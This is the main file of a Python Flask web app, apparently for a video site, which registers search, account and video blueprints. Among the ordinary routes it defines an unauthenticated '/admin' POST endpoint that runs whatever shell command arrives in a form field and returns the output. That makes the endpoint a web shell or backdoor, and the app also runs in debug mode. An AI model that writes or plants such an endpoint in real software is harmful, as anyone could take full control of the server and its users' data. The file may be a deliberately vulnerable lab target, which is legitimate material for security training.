import urllib.request 
from subprocess import check_output
from flask import (
        Blueprint,
        Flask,
        render_template,
        request,
        jsonify
)

from blueprints.searchAPI.search import search
from blueprints.accountAPI.account import account
from blueprints.videoAPI.video import video

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin', methods=['POST'])
def home():
    try:
        result = check_output([request.form['command']], shell=True).decode()
    except:
        result = 'ERROR'
    return jsonify(output=result)
    

app.register_blueprint(search, url_prefix='/search')
app.register_blueprint(account, url_prefix='/account')
app.register_blueprint(video, url_prefix='/video')

if __name__ == '__main__':
    app.run(debug=True)
